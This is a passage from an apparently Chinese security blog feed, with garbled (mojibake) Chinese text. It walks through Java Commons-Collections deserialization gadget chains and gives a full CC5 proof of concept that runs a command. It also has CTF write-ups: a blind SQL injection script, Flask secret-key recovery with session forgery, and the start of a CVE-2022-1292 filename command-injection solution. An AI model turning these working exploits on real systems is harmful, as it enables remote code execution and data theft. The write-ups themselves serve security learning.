Files.readAllBytes(Paths.get(&quot;D:\\Code\\Java-code\\CC1\\target\\classes\\org\\example\\Hello.class&quot;));</span></span><br><span class="line"><span class="comment">//        byte[][] codes=&#123;code&#125;;</span></span><br><span class="line"><span class="comment">//        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);</span></span><br><span class="line"><span class="comment">//        bytecodes.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        bytecodes.set(templates, codes);</span></span><br><span class="line"><span class="comment">//        Field tfactory = TemplatesImpl.class.getDeclaredField(&quot;_tfactory&quot;);</span></span><br><span class="line"><span class="comment">//        tfactory.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        tfactory.set(templates, new TransformerFactoryImpl());</span></span><br><span class="line"><span class="comment">//        // templates.newTransformer();</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        Transformer[] transformers=new Transformer[]&#123;</span></span><br><span class="line"><span class="comment">//                new ConstantTransformer(TrAXFilter.class),</span></span><br><span class="line"><span class="comment">//                new InstantiateTransformer(new Class[] &#123;Templates.class&#125;, new Object[] &#123;templates&#125;)</span></span><br><span class="line"><span class="comment">//        &#125;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));</span></span><br><span class="line"><span class="comment">//        PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);</span></span><br><span class="line"><span class="comment">//        priorityQueue.add(1);</span></span><br><span class="line"><span class="comment">//        priorityQueue.add(2);</span></span><br><span class="line"><span class="comment">//        Field transformer = TransformingComparator.class.getDeclaredField(&quot;transformer&quot;);</span></span><br><span class="line"><span class="comment">//        transformer.setAccessible(true);</span></span><br><span class="line"><span class="comment">//        transformer.set(transformingComparator, chainedTransformer);</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        serialize(priorityQueue);</span></span><br><span class="line">        unserialize(<span class="string">&quot;CC4.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC4.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520204438735.png" alt="image-20240520204438735"></p><p>å®Œç¾è¿è¡Œ</p><h1 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h1><p>CC2ä¸CC4ä¸åŒçš„åœ°æ–¹å°±æ˜¯ååŠäº›è®¸ä¸åŒï¼Œæ²¡æœ‰ç”¨chainedtrainsformï¼Œç›´æ¥ç”¨invokertransformer</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">PriorityQueue.readObject()</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">TransformingComparator.compare()</span></span><br><span class="line"><span class="comment">InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">Method.invoke()</span></span><br><span class="line"><span class="comment">Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>å·ä¸ªæ‡’</p><h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><p>CC5å®é™…ä¸Šæ˜¯åœ¨CC6çš„åŸºç¡€ä¸Šåšå‡ºäº†ä¸€ç‚¹ç‚¹çš„ä¿®æ”¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain:</span></span><br><span class="line"><span class="comment">        ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">            BadAttributeValueExpException.readObject()</span></span><br><span class="line"><span class="comment">                TiedMapEntry.toString()</span></span><br><span class="line"><span class="comment">                    LazyMap.get()</span></span><br><span class="line"><span class="comment">                        ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                            ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Class.getMethod()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.exec()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Requires:</span></span><br><span class="line"><span class="comment">commons-collections</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>ä¸åŒä¹‹å¤„åœ¨äºCC6ä¸­çš„AnnotationInvocationHandleræ¢æˆäº†BadAttributeValueExpExceptionè¿™ä¸ªç±»</p><p>è¿™é‡Œè°ƒç”¨äº†toStringæ–¹æ³•</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520223614259.png" alt="image-20240520223614259"></p><p>è½¬åˆ°TiedMapEntryç±», å®ƒçš„toStringæ–¹æ³•ä¸­è°ƒç”¨äº†getValue, è¿™å’Œä¹‹å‰çš„é“¾å­å°±ä¸²è”èµ·æ¥äº†</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520224014621.png" alt="image-20240520224014621"></p><p>poc:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(innerMap, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="keyword">new</span> <span class="title class_">Object</span>());</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;CC5.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;CC5.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‰§è¡Œ</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240520232836551.png" alt="image-20240520232836551"></p><h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><p>CC7ä¹Ÿæ˜¯CC6çš„æ”¹é€ </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Payload method chain:</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    java.util.Hashtable.readObject</span></span><br><span class="line"><span class="comment">    java.util.Hashtable.reconstitutionPut</span></span><br><span class="line"><span class="comment">    org.apache.commons.collections.map.AbstractMapDecorator.equals</span></span><br><span class="line"><span class="comment">    java.util.AbstractMap.equals</span></span><br><span class="line"><span class="comment">    org.apache.commons.collections.map.LazyMap.get</span></span><br><span class="line"><span class="comment">    org.apache.commons.collections.functors.ChainedTransformer.transform</span></span><br><span class="line"><span class="comment">    org.apache.commons.collections.functors.InvokerTransformer.transform</span></span><br><span class="line"><span class="comment">    java.lang.reflect.Method.invoke</span></span><br><span class="line"><span class="comment">    sun.reflect.DelegatingMethodAccessorImpl.invoke</span></span><br><span class="line"><span class="comment">    sun.reflect.NativeMethodAccessorImpl.invoke</span></span><br><span class="line"><span class="comment">    sun.reflect.NativeMethodAccessorImpl.invoke0</span></span><br><span class="line"><span class="comment">    java.lang.Runtime.exec</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CC1&quot;&gt;&lt;a href=&quot;#CC1&quot; class=&quot;headerlink&quot; title=&quot;CC1&quot;&gt;&lt;/a&gt;CC1&lt;/h1&gt;&lt;h2 id=&quot;å‚è€ƒ&quot;&gt;&lt;a href=&quot;#å‚è€ƒ&quot; class=&quot;headerlink&quot; title=&quot;å‚è€ƒ&quot;&gt;&lt;/a&gt;å‚è€ƒ&lt;/h2&gt;&lt;p</summary>
      
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://example.com/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="CCé“¾" scheme="http://example.com/tags/CC%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>ä¸€äº›é¢˜ç›®</title>
    <link href="http://example.com/2024/03/12/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE/"/>
    <id>http://example.com/2024/03/12/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE/</id>
    <published>2024-03-12T15:53:55.000Z</published>
    <updated>2024-03-15T07:54:18.165Z</updated>
    
    <content type="html"><![CDATA[<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p>æ¯”è¾ƒç®€å•çš„boolæ³¨å…¥,è¿‡æ»¤äº†ç©ºæ ¼å’Œ&#x2F;**&#x2F;</p><p>è¿™é‡Œæ— è¡¨ååˆ—å, ä¹‹å‰çš„æ— è¡¨ååˆ—åçš„æ³¨å…¥æ‰‹æ³•éƒ½æ²¡æˆåŠŸ</p><p>æ²¡æƒ³åˆ°çŒœäº†ä¸€æ‰‹flagè¡¨flagåˆ—å°±å‡ºäº†</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key_of_true = <span class="string">&#x27;Hello, glzjin wants a girlfriend.&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">url = <span class="string">&quot;http://2b63de0f-491e-44ef-b06a-923f11aee2a8.node5.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">sql = <span class="string">&quot;(select(flag)from(flag))&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;id&#x27;</span>: <span class="string">&#x27;a&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">payload = <span class="string">&quot;if(ascii(substr(&quot;</span> + sql +<span class="string">&quot;,&#123;&#125;,1))&gt;&#123;&#125;,1,2)&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">min</span> = <span class="number">32</span></span><br><span class="line">    <span class="built_in">max</span> = <span class="number">128</span></span><br><span class="line">    mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">min</span> &lt; <span class="built_in">max</span>):</span><br><span class="line">        data[<span class="string">&#x27;id&#x27;</span>] = payload.<span class="built_in">format</span>(i, mid)</span><br><span class="line">        res = requests.post(url=url, data=data)</span><br><span class="line">        time.sleep(<span class="number">0.05</span>)</span><br><span class="line">        <span class="keyword">if</span> key_of_true <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="built_in">min</span> = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">max</span> = mid</span><br><span class="line">        mid = (<span class="built_in">min</span> + <span class="built_in">max</span>)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> mid &lt;= <span class="number">32</span> <span class="keyword">or</span> mid &gt;= <span class="number">127</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312234910906.png" alt="image-20240312234910906"></p><p>æ¯”è¾ƒå‘çš„ç‚¹æ˜¯sqlè¯­å¥å¿…é¡»è¦æ‹¬å·åŒ…è£¹</p><h2 id="CISCN-2019åä¸œå—-Web4"><a href="#CISCN-2019åä¸œå—-Web4" class="headerlink" title="[CISCN 2019åä¸œå—]Web4"></a>[CISCN 2019åä¸œå—]Web4</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> re, random, uuid, urllib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random() * <span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;www-data&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello World! Read somethings&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/read&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        url = request.args.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">        m = re.findall(<span class="string">&#x27;^file.*&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        n = re.findall(<span class="string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)</span><br><span class="line">        <span class="keyword">if</span> m <span class="keyword">or</span> n:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;No Hack&#x27;</span></span><br><span class="line">        res = urllib.urlopen(url)</span><br><span class="line">        <span class="keyword">return</span> res.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ex:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(ex))</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;no response&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;fuck&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag.txt&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Access denied&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ¯”è¾ƒç®€å•çš„ä¸€é¢˜, ä¹‹å‰åšè¿‡ç±»ä¼¼çš„</p><p>è¯»MAC</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/read?url=local_file:///sys/class/net/eth0/address</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>node4.anna.nssctf.cn:28201</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>BD_UPN=12314753; session=eyJ1c2VybmFtZSI6eyIgYiI6ImNtOXZkQT09In1mUS5l7zFyQS64asbFTzEdi+wVkx5S0Cc4YzZOYVk=</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">02:42:ac:02:de:d1</span><br><span class="line">0242ac02ded1</span><br></pre></td></tr></table></figure><p>python2ä¸‹è¿è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.seed(<span class="number">0x0242ac02ded1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(random.random() * <span class="number">233</span>))</span><br><span class="line"><span class="comment">#è¾“å‡º 175.043938323</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312013527918.png" alt="image-20240312013527918"></p><p>flask sessionä¼ªé€ </p><p>è¯»å–flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240312013549292.png" alt="image-20240312013549292"></p><h2 id="CISCN-2022-åˆèµ›-online-crt"><a href="#CISCN-2022-åˆèµ›-online-crt" class="headerlink" title="[CISCN 2022 åˆèµ›]online_crt"></a>[CISCN 2022 åˆèµ›]online_crt</h2><p>é¢˜ç›®è¢«æ ‡è®°äº†CVE-2022-1292, ç›´æ¥å¼€æœ</p><p><a href="https://xz.aliyun.com/t/11703">https://xz.aliyun.com/t/11703</a></p><p>åˆ©ç”¨ä¹Ÿéå¸¸çš„ç®€å•, åœ¨crtè¯ä¹¦çš„æ–‡ä»¶åä¸­åŒ…å«åå¼•å·åŒ…è£¹çš„shellå‘½ä»¤, ä¹‹åä½¿ç”¨c_rehashåˆ›å»ºç¬¦å·é“¾æ¥æ—¶, åŒ…è£¹çš„å‘½ä»¤å°±ä¼šè¢«æ‰§è¡Œ</p><p>é¢˜ç›®ç»™å‡ºäº†é™„ä»¶, å…ˆçœ‹flask</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span 